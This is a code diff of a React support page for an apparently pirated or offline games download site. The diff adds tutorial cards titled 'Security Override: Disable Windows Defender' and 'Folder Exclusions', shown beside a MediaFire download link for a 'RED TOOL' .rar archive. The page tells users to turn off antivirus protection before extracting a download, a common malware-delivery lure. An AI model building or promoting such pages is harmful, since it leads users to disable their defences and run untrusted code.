@@ -1,4 +1,4 @@
-import { MapPin, ChevronRight, MessageSquare, PlayCircle, Download, Wrench, Video, Terminal, ExternalLink } from 'lucide-react'
+import { MapPin, ChevronRight, MessageSquare, PlayCircle, Download, Wrench, Video, Terminal, ExternalLink, Shield, Folder } from 'lucide-react'
 import redToolPreview from '../images/redtool.png'
 
 const socials = [
@@ -136,20 +136,20 @@ export default function Support() {
       </div>
 
       <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-        
+
         <div className="bg-[#111] border border-white/10 rounded-sm p-4 flex flex-col group hover:border-white/20 transition-colors">
           <div className="flex items-center justify-between mb-4">
             <div className="flex items-center gap-2 text-white">
-              <Video size={14} className="text-red-500" />
-              <span className="text-xs font-black uppercase tracking-widest">Installation Briefing</span>
+              <Shield size={14} className="text-red-500" />
+              <span className="text-xs font-black uppercase tracking-widest">Phase 1: Security Override</span>
             </div>
-            <span className="text-[9px] font-bold text-neutral-500 uppercase tracking-widest">04:20</span>
+            <span className="text-[9px] font-bold text-neutral-500 uppercase tracking-widest">02:15</span>
           </div>
           
-          <a href="https://youtube.com" target="_blank" rel="noopener noreferrer" className="relative w-full aspect-video bg-[#0a0a0a] rounded-sm overflow-hidden mb-4 border border-white/5 active:scale-[0.99] transition-transform">
+          <a href="https://www.youtube.com/watch?v=j0U4SqUWtpk" target="_blank" rel="noopener noreferrer" className="relative w-full aspect-video bg-[#0a0a0a] rounded-sm overflow-hidden mb-4 border border-white/5 active:scale-[0.99] transition-transform">
             <img 
-              src="https://images.unsplash.com/photo-1587202372634-32705e3bf49c?q=80&w=800&auto=format&fit=crop" 
-              alt="Tutorial Thumbnail" 
+              src="https://i.ytimg.com/vi/llxYDN-gV9o/maxresdefault.jpg" 
+              alt="Disable Defender Tutorial" 
               className="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:opacity-80 transition-opacity duration-500" 
             />
             <div className="absolute inset-0 bg-black/20 group-hover:bg-black/10 transition-colors duration-500"></div>
@@ -161,8 +161,66 @@ export default function Support() {
           </a>
           
           <div>
-            <h4 className="text-xs font-black text-white uppercase tracking-widest mb-1">How to Initialize Your Drive</h4>
-            <p className="text-[10px] font-bold text-neutral-400 leading-relaxed">Watch this visual guide on how to properly mount and execute your custom offline games vault on your local system.</p>
+            <h4 className="text-xs font-black text-white uppercase tracking-widest mb-1">Disable Windows Defender</h4>
+            <p className="text-[10px] font-bold text-neutral-400 leading-relaxed">How to temporarily disable real-time protection to prevent false-positive deletions during game extraction.</p>
+          </div>
+        </div>
+
+        <div className="bg-[#111] border border-white/10 rounded-sm p-4 flex flex-col group hover:border-white/20 transition-colors">
+          <div className="flex items-center justify-between mb-4">
+            <div className="flex items-center gap-2 text-white">
+              <Folder size={14} className="text-red-500" />
+              <span className="text-xs font-black uppercase tracking-widest">Phase 2: Whitelist & Setup</span>
+            </div>
+            <span className="text-[9px] font-bold text-neutral-500 uppercase tracking-widest">03:45</span>
+          </div>
+          
+          <a href="https://www.youtube.com/watch?v=QSAzwPc1GSA" target="_blank" rel="noopener noreferrer" className="relative w-full aspect-video bg-[#0a0a0a] rounded-sm overflow-hidden mb-4 border border-white/5 active:scale-[0.99] transition-transform">
+            <img 
+              src="https://i.ytimg.com/vi/KCoQyKsZVPg/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLDcnQYWWqZDN64Us4p9qucUzNTWLg" 
+              alt="Folder Exclusions Tutorial" 
+              className="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:opacity-80 transition-opacity duration-500" 
+            />
+            <div className="absolute inset-0 bg-black/20 group-hover:bg-black/10 transition-colors duration-500"></div>
+            <div className="absolute inset-0 flex items-center justify-center">
+              <div className="w-16 h-16 bg-red-600/90 rounded-full flex items-center justify-center backdrop-blur-sm group-hover:scale-110 group-hover:bg-red-500 shadow-[0_0_20px_rgba(239,68,68,0.5)] transition-all duration-300">
+                <PlayCircle size={32} className="text-white ml-1" />
+              </div>
+            </div>
+          </a>
+          
+          <div>
+            <h4 className="text-xs font-black text-white uppercase tracking-widest mb-1">Folder Exclusions</h4>
+            <p className="text-[10px] font-bold text-neutral-400 leading-relaxed">Step-by-step guide to adding folder exclusions.</p>
+          </div>
+        </div>
+        
+        <div className="bg-[#111] border border-white/10 rounded-sm p-4 flex flex-col group hover:border-white/20 transition-colors">
+          <div className="flex items-center justify-between mb-4">
+            <div className="flex items-center gap-2 text-white">
+              <Video size={14} className="text-red-500" />
+              <span className="text-xs font-black uppercase tracking-widest">Phase 3: Initialization</span>
+            </div>
+            <span className="text-[9px] font-bold text-neutral-500 uppercase tracking-widest">04:20</span>
+          </div>
+          
+          <a href="https://www.youtube.com/watch?v=ytbw7q2Rqdw" target="_blank" rel="noopener noreferrer" className="relative w-full aspect-video bg-[#0a0a0a] rounded-sm overflow-hidden mb-4 border border-white/5 active:scale-[0.99] transition-transform">
+            <img 
+              src="https://i.ytimg.com/vi/8PGkqi0FgvY/maxresdefault.jpg" 
+              alt="Installation Tutorial" 
+              className="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:opacity-80 transition-opacity duration-500" 
+            />
+            <div className="absolute inset-0 bg-black/20 group-hover:bg-black/10 transition-colors duration-500"></div>
+            <div className="absolute inset-0 flex items-center justify-center">
+              <div className="w-16 h-16 bg-red-600/90 rounded-full flex items-center justify-center backdrop-blur-sm group-hover:scale-110 group-hover:bg-red-500 shadow-[0_0_20px_rgba(239,68,68,0.5)] transition-all duration-300">
+                <PlayCircle size={32} className="text-white ml-1" />
+              </div>
+            </div>
+          </a>
+          
+          <div>
+            <h4 className="text-xs font-black text-white uppercase tracking-widest mb-1">Install Redistributable</h4>
+            <p className="text-[10px] font-bold text-neutral-400 leading-relaxed">Step-by-Step guide on how to installing required DirectX and VC++ packages.</p>
           </div>
         </div>
 
@@ -187,16 +245,12 @@ export default function Support() {
               <span className="px-2 py-1 bg-white/10 border border-white/20 rounded-sm text-[8px] font-black text-white uppercase tracking-widest backdrop-blur-md">Visual C++</span>
             </div>
           </div>
-          
-          <div className="flex flex-col flex-grow">
-            <h4 className="text-xs font-black text-white uppercase tracking-widest mb-1">All-In-One Runtime Installer</h4>
-            <p className="text-[10px] font-bold text-neutral-400 leading-relaxed mb-4">Built in C#, this utility automatically detects and installs missing DirectX and Visual Studio C++ redistributables required for optimal game performance.</p>
-            
-            <a href="https://download1334.mediafire.com/5vflxl7l9szgHPRd0fWUy60cZdchhqw8ay1Y1T0n-XnfLdfwDPzQiGm27wG-1KqcPUhwvt3R0B0-Zu_TwWHXI4wpvRCuioks0UM7In_msfq4tHb_jagbrRhA_B3imx5G6Op1ETMiPsmSQAj06-AlpORCygwxZCG-oGU7lm9O-QIg/dyzzzwunvtjllu1/REDTOOL.rar" target="_blank" rel="noopener noreferrer" className="w-full mt-auto py-3 bg-red-600 text-white rounded-sm text-[10px] font-black uppercase tracking-widest flex items-center justify-center gap-2 hover:bg-red-500 hover:shadow-[0_0_15px_rgba(239,68,68,0.5)] active:scale-[0.98] transition-all transform-gpu">
-              <Download size={14} /> Download RED TOOL (.rar)
-            </a>
 
-            <div className="mt-4 pt-3 border-t border-white/10">
+          <a href="https://download1334.mediafire.com/5vflxl7l9szgHPRd0fWUy60cZdchhqw8ay1Y1T0n-XnfLdfwDPzQiGm27wG-1KqcPUhwvt3R0B0-Zu_TwWHXI4wpvRCuioks0UM7In_msfq4tHb_jagbrRhA_B3imx5G6Op1ETMiPsmSQAj06-AlpORCygwxZCG-oGU7lm9O-QIg/dyzzzwunvtjllu1/REDTOOL.rar" target="_blank" rel="noopener noreferrer" className="w-full mt-auto py-3 bg-red-600 text-white rounded-sm text-[10px] font-black uppercase tracking-widest flex items-center justify-center gap-2 hover:bg-red-500 hover:shadow-[0_0_15px_rgba(239,68,68,0.5)] active:scale-[0.98] transition-all transform-gpu">
+              <Download size={14} /> Download RED TOOL (.rar)
+          </a>
+          
+          <div className="mt-4 pt-3 border-t border-white/10">
               <span className="text-[9px] font-black text-neutral-500 uppercase tracking-widest mb-2 block">Additional Runtimes Links:</span>
               <div className="flex flex-wrap gap-2">
                 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=35" target="_blank" rel="noopener noreferrer" className="flex items-center gap-1.5 px-2 py-1.5 bg-[#222] hover:bg-[#333] border border-white/5 rounded-sm text-[9px] font-black text-neutral-300 uppercase tracking-widest transition-colors">
@@ -216,7 +270,6 @@ export default function Support() {
                 </a>
               </div>
             </div>
-          </div>
         </div>
 
       </div>
